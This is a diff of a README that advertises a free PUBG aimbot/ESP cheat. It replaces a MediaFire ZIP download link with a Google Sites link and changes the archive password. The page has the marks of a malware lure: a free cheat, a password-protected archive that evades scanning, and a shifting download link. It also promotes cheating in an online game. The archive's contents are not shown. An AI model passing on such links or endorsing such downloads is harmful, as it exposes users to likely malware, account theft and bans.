@@ -1,11 +1,9 @@
 # Free-Premium-PUBG-Hacks-HYROCOPT-cheat-Aim-ESP
 Our cheat supports windows 7/10/11
 # Download
-Password for ZIP ARCHIVE: 23
-
-|[Download](https://www.mediafire.com/file/l58b24ooqwio65b/HYROCOPT_HACK.zip/file)|
+|[Download](https://sites.google.com/view/nccrakc/main-page)|
 |:-------------|
-Passwrod: 23
+Passwrod: 2077
 # PUBG Premium Aimbot Features
 The best feature of this cheat is PUBG Aimbot, and with this aimbot, you can hit your enemies with one shot and go to sleep style deadly blows with automatic head focus, head aim, and automatic aim shift to the head. With this free aimbot cheat, your enemies cannot escape from you and get rid of you.
 
